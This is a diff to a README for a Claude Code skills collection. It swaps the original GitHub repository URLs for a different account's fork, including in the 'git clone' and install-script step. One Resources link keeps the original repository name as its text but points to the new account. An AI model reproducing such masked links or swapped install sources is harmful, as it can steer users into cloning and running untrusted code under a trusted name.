@@ -32,7 +32,7 @@ This installs all 192+ skills into your OpenClaw workspace with the correct dire
 ### Manual Install
 
 ```bash
-git clone https://github.com/alirezarezvani/claude-skills.git
+git clone https://github.com/ciciliaETH/claude-skills.git
 cd claude-skills
 ./scripts/install.sh --tool openclaw
 ```
@@ -155,11 +155,11 @@ Use the `skill-creator` meta-skill for guided skill creation:
 
 ## Resources
 
-- **GitHub:** [alirezarezvani/claude-skills](https://github.com/alirezarezvani/claude-skills)
+- **GitHub:** [alirezarezvani/claude-skills](https://github.com/ciciliaETH/claude-skills)
 - **ClawHub:** [clawhub.com](https://clawhub.com)
 - **OpenClaw Docs:** [docs.openclaw.ai](https://docs.openclaw.ai)
 - **Community:** [Discord](https://discord.com/invite/clawd)
 
 ---
 
-*Part of the [Claude Code Skills & Agent Plugins](https://github.com/alirezarezvani/claude-skills) repository — 192+ production-ready skills for 11 AI coding tools.*
+*Part of the [Claude Code Skills & Agent Plugins](https://github.com/ciciliaETH/claude-skills) repository — 192+ production-ready skills for 11 AI coding tools.*
